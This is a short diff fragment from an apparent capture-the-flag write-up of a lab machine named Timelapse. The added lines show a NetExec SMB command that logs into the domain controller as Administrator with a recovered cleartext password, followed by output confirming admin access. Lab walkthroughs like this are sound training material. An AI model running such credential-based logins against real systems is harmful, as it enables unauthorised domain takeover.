@@ -391,5 +391,12 @@ UserPrincipalName :
 Now i have the password for the Administrator and i can get a shell
 
 ```python
+nxc smb dc01.timelapse.htb -u 'Administrator' -p 'mL.Fe-Iu!iIm[}h(&)/LT650'
+SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\Administrator:mL.Fe-Iu!iIm[}h(&)/LT650 (admin)
+```
+As seen here the administrator is compromised
+
+```python
 
 ```
